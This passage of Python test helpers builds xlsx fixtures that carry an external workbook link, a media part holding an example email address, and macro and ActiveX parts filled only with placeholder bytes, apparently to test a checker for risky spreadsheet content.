                '<externalLink xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
                '<externalBook xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" r:id="rId1">'
                '<sheetNames><sheetName val="Sheet1"/></sheetNames>'
                "</externalBook>"
                "</externalLink>"
            ),
        )
        destination.writestr(
            "xl/externalLinks/_rels/externalLink1.xml.rels",
            (
                '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
                '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/externalLinkPath" Target="../prod-budget.xlsx" TargetMode="External"/>'
                "</Relationships>"
            ),
        )
    replacement.replace(path)


def _add_media_part(path: Path) -> None:
    replacement = path.with_name(f"{path.stem}-with-media{path.suffix}")
    with zipfile.ZipFile(path, "r") as source, zipfile.ZipFile(replacement, "w") as destination:
        for info in source.infolist():
            destination.writestr(info, source.read(info.filename))
        destination.writestr("xl/media/image1.txt", "jan@example.com")
    replacement.replace(path)


def _add_macro_and_activex_parts(path: Path) -> None:
    replacement = path.with_name(f"{path.stem}-with-active-content{path.suffix}")
    with zipfile.ZipFile(path, "r") as source, zipfile.ZipFile(replacement, "w") as destination:
        for info in source.infolist():
            data = source.read(info.filename)
            if info.filename == "[Content_Types].xml":
                data = data.replace(
                    b"</Types>",
                    b'<Override PartName="/xl/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/>'
                    b'<Override PartName="/xl/activeX/activeX1.bin" ContentType="application/vnd.ms-office.activeX"/>'
                    b'<Override PartName="/xl/ctrlProps/ctrlProp1.xml" ContentType="application/vnd.ms-excel.controlproperties+xml"/>'
                    b"</Types>",
                )
            elif info.filename == "xl/_rels/workbook.xml.rels":
                data = data.replace(
                    b"</Relationships>",
                    b'<Relationship Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin" Id="rIdMacro"/>'
                    b"</Relationships>",
                )
            destination.writestr(info, data)
        destination.writestr(
            "xl/worksheets/_rels/sheet1.xml.rels",
            (
                '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
                '<Relationship Id="rIdActiveX" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="../activeX/activeX1.bin"/>'
                "</Relationships>"
            ),
        )
        destination.writestr("xl/vbaProject.bin", b"macro")
        destination.writestr("xl/activeX/activeX1.bin", b"activex")
        destination.writestr("xl/ctrlProps/ctrlProp1.xml", "<controlPr/>")
    replacement.replace(path)
